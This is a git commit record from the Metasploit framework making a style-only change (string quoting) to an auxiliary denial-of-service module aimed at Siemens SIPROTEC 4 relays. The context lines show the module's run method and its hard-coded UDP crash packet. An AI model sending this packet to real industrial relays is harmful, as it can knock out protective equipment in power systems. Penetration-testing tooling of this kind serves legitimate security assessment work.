28d890147bc1a60dd47c8082fed18dbfdd7a8c2d
Can <0x43414e@gmail.com>
2018-03-13 09:30:48 +0100

    msftidy update and style changes

--- modules/auxiliary/dos/scada/siemens_siprotec4.rb
+++ modules/auxiliary/dos/scada/siemens_siprotec4.rb
@@ -29,7 +29,7 @@ class MetasploitModule < Msf::Auxiliary
   def run
       connect_udp
       pckt = "\x11\x49\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x9e"
-      print_status("Sending DoS packet ... ")
+      print_status('Sending DoS packet...')
       udp_sock.put(pckt)
       disconnect_udp
   end
